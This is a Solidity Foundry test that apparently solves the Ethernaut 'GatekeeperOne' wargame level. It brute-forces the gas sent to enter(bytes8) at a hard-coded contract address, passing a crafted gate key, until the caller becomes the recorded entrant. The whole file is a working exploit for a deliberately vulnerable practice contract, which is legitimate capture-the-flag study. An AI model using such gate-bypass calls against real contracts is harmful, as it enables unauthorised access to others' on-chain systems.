// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/Gatekeeper.sol";

contract CounterTest is Test {
    GatekeeperOne public gate;

    address public addr = 0x73c8d471003E2db699093bD7899D10e2E9285b5e;

    function testAttack() public {
        bool success;
        for (uint i = 1; i <= 200; i++) {
            (success,) = addr.call{gas: 33035 - i}(abi.encodeWithSignature("enter(bytes8)", bytes8(hex"0000000100001F38")));
            if (GatekeeperOne(addr).entrant() == tx.origin && success) {
                console.log(i);
                break;
            }
        }

        assertTrue(success);
        assertEq(GatekeeperOne(addr).entrant(), tx.origin);
    }

}
